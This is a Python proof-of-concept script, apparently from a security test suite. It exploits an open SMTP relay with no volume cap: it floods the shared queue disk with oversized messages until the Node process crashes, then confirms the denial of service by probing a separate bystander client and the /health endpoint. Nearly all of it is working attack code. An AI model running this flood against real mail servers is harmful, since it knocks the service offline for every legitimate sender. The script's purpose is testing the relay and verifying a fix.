#!/usr/bin/env python3
"""
PoC #1: Open relay, no volume cap -> shared queue-disk exhaustion DoS
----------------------------------------------------------------------
Location: SmtpSession.onRcptTo() (no auth/allow-list check at all - any
destination domain is accepted from anyone) and queue.writeMessage()
(src/queue.js - every accepted message is written straight to
MTA_QUEUE_DIR/new with no per-sender or global quota check anywhere in the
path). Nothing meters how much mail one client may push through this relay.

That is scoreable, not just a hygiene issue: MTA_QUEUE_DIR is the SAME
disk/volume every caller's accepted mail lands on. An unauthenticated client
can queue an unbounded number of large messages with nothing to stop it,
filling that shared disk out from under every other legitimate sender - and
because queue.writeMessage() calls fs.writeFileSync() with no try/catch
anywhere in the call chain (finishData() -> queue.writeMessage()), the
ENOSPC error a write hits once the disk is full is an *uncaught* exception
thrown from inside a socket 'data' handler, which crashes the entire Node
process. With no restart supervisor (entrypoint.sh just execs node, no
compose restart: policy) the relay stays down: one attacker with no
credentials takes the whole service down for everyone.

CONFIRMATION IS BY LIVENESS / BYSTANDER IMPACT, NOT BY THE ATTACK SESSION'S
OWN FATE. That the flood's own messages were accepted only proves the missing
cap, not a denial of service. What proves the DoS is that a SEPARATE ordinary
client is denied afterward. So we (0) baseline: a normal SMTP transaction from
a separate connection succeeds AND admin /health answers "ok"; (1) attack:
flood the open relay with oversized messages until the shared queue disk is
exhausted and the uncaught ENOSPC crashes the process; (2) re-probe liveness
from a separate client - the DoS is confirmed only if the bystander (normal
SMTP transaction + /health) is now denied (connection refused, since the
process died and does not restart). If the bystander is still served, the
disk was not exhausted and this is reported as NOT a full DoS.

The vuln_tests/docker-compose.yml gives MTA a small, fixed-size tmpfs
(MTA_QUEUE_DIR, ~24m) so the shared disk is quickly exhaustible without
writing real gigabytes - the missing cap and the uncaught ENOSPC crash are
both 100% real; only the quota size is scaled down.

WARNING: this genuinely takes the target down (Node crashes and does not
restart) - run it against a throwaway instance.

Run: python3 01_relay_disk_exhaustion.py [host] [port] [admin_port] [msg_mb] [max_msgs]
     defaults: 127.0.0.1 2525 8081 6 8
"""
import os
import socket
import sys
import time
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
# The domain this relay delivers LOCALLY for (config.DOMAIN / MTA_DOMAIN). A
# message to this domain is accepted from anyone, before and after the open-relay
# fix, so it is what an ordinary bystander uses. (Relaying to any OTHER domain is
# exactly VULN #1 and is refused once patched.)
DOMAIN = os.environ.get("MTA_DOMAIN", "mta.local")
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
MSG_MB = int(sys.argv[4]) if len(sys.argv) > 4 else 6
MAX_MSGS = int(sys.argv[5]) if len(sys.argv) > 5 else 8

# A crashed relay refuses connections immediately, so two consecutive denials at
# a 1s cadence confirm in ~2s; the window only bounds the no-DoS case. Kept tight
# (was 20s/2s) so neither path approaches the per-PoC budget.
LIVENESS_WINDOW = 12
LIVENESS_INTERVAL = 1.0
HEALTH_TIMEOUT = 3


def read_reply(sock, timeout=10):
    sock.settimeout(timeout)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line, timeout=10):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock, timeout)


def normal_txn(timeout=10):
    """A well-behaved, small SMTP transaction from a SEPARATE connection - the
    bystander. Returns (ok, detail); ok is True only on a '250 ... queued'."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        read_reply(s)
        cmd(s, "EHLO bystander.example")
        cmd(s, "MAIL FROM:<bystander@example.com>")
        # Local delivery (not a relay), so an ordinary unauthenticated client is
        # served whether or not the open relay has been closed. Relaying to an
        # off-domain recipient here would itself be refused by a patched relay,
        # making this liveness probe falsely read the fix as "MTA down".
        cmd(s, f"RCPT TO:<alice@{DOMAIN}>")
        r = cmd(s, "DATA")
        if not r.startswith("354"):
            s.close()
            return False, f"DATA refused: {r.strip()!r}"
        r = cmd(s, "Subject: bystander liveness probe\r\n\r\nordinary mail.\r\n.")
        s.close()
        return r.startswith("250"), r.strip()
    except (OSError, socket.timeout) as e:
        return False, type(e).__name__


def probe_health(timeout=HEALTH_TIMEOUT):
    try:
        with urllib.request.urlopen(
            f"http://{HOST}:{ADMIN_PORT}/health", timeout=timeout
        ) as r:
            body = r.read().decode(errors="replace")
            return (r.status == 200 and "ok" in body), f"{r.status} {body.strip()!r}"
    except urllib.error.HTTPError as e:
        return False, f"HTTP {e.code}"
    except Exception as e:
        return False, type(e).__name__


def bystander_ok():
    up, hd = probe_health()
    ok, td = normal_txn()
    return up and ok, f"/health={hd}; smtp={td}"


def flood_relay(n_msgs, size_mb):
    """As a totally unauthenticated open-relay client (VULN #1), push repeated
    oversized messages with no volume cap of any kind onto the shared queue
    disk. Returns how many were accepted before the relay stopped taking mail
    (the point at which the disk filled and the process crashed)."""
    accepted = 0
    for i in range(n_msgs):
        try:
            sock = socket.create_connection((HOST, PORT), timeout=10)
            read_reply(sock)
            cmd(sock, "EHLO attacker.example")
            cmd(sock, f"MAIL FROM:<flood{i}@attacker.example>")
            cmd(sock, f"RCPT TO:<anyone{i}@some-other-domain.example>")
            r = cmd(sock, "DATA")
            if not r.startswith("354"):
                print(f"[*] flood msg {i}: DATA rejected ({r.strip()!r}) - stopping")
                sock.close()
                break
            sock.sendall(f"Subject: flood-{i}\r\n\r\n".encode())
            sock.sendall(b"A" * (size_mb * 1024 * 1024))
            sock.sendall(b"\r\n.\r\n")
            r = read_reply(sock, timeout=8)
            sock.close()
            if "queued as" in r:
                accepted += 1
                print(f"[*] flood msg {i}: accepted ({size_mb}MB, no cap enforced)")
            else:
                print(f"[*] flood msg {i}: server responded {r.strip()!r} "
                      "(likely mid-crash on a full disk)")
        except (OSError, socket.timeout) as e:
            print(f"[*] flood msg {i}: connection failed ({type(e).__name__}) - "
                  "shared relay appears to have gone down")
            break
    return accepted


def main():
    # 0) Baseline: a separate ordinary client must be served before we attack.
    ok, detail = bystander_ok()
    if not ok:
        print(f"[!] Pre-check: bystander not served ({detail}); is MTA running "
              "and healthy? Cannot run a DoS test against an already-down relay.")
        return 2
    print(f"[*] Pre-check: bystander served OK ({detail})")

    print(f"[*] Attacking: flooding the OPEN RELAY (no auth, no allow-list, no "
          f"volume cap - VULN #1) with up to {MAX_MSGS} x {MSG_MB}MB messages "
          "onto the shared queue disk ...")
    accepted = flood_relay(MAX_MSGS, MSG_MB)
    print(f"[*] Flood pushed {accepted} oversized message(s) through with zero "
          "authentication or quota check")

    # 2) Liveness watch: is a SEPARATE client denied, not just the attacker?
    print(f"[*] Re-probing bystander liveness for up to {LIVENESS_WINDOW}s ...")
    deadline = time.time() + LIVENESS_WINDOW
    down_streak = 0
    last = ""
    while time.time() < deadline:
        ok, detail = bystander_ok()
        last = detail
        if ok:
            down_streak = 0
        else:
            down_streak += 1
            print(f"[*]   bystander denied ({detail}) [{down_streak} consecutive]")
            if down_streak >= 2:
                print("[+] Relay disk-exhaustion DoS confirmed - a separate "
                      "ordinary client is now denied (SMTP + admin /health both "
                      "stopped answering). The unmetered flood filled the shared "
                      "queue disk; the uncaught ENOSPC crashed Node and, with no "
                      "restart supervisor, the whole relay is down for everyone, "
                      "not just the attacker's own connection.")
                return 0
        time.sleep(LIVENESS_INTERVAL)

    print(f"[-] Bystander still served at end of window (last: {last}). The flood "
          "did NOT exhaust the shared disk / deny the service - not a full DoS "
          "(try a larger msg_mb/max_msgs, or check the queue tmpfs size in "
          "vuln_tests/docker-compose.yml).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
